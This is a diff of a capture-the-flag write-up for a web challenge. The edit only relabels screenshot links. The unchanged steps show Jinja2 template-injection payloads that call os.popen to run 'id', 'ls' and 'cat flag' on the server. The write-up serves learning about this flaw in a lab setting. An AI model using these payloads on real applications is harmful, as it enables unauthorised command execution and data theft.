@@ -114,19 +114,19 @@ The output is
 {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 and we get the output
-![screenshot of webpage test output ](./Screenshots/WebExp_Challenge2_testoutput.jpg)
+![screenshot of webpage test ](./Screenshots/WebExp_Challenge2_test1.jpg)
 
 4.Now that we have confirmed our suspicions we can check the files present in the directory using
 ```
 {{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
 ```
-![screenshot of webpage test output ](./Screenshots/WebExp_Challenge2_testoutput.jpg)
+![screenshot of webpage current directory](./Screenshots/WebExp_Challenge2_test2.jpg)
 
 5.Upon opening the file present in the directory we get the flag,we use the input
 ```
 {{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
 ```
-![screenshot of webpage test output ](./Screenshots/WebExp_Challenge2_testoutput.jpg)
+![screenshot of webpage flag ](./Screenshots/WebExp_Challenge2_flag.jpg)
 
 
 ## Flag:
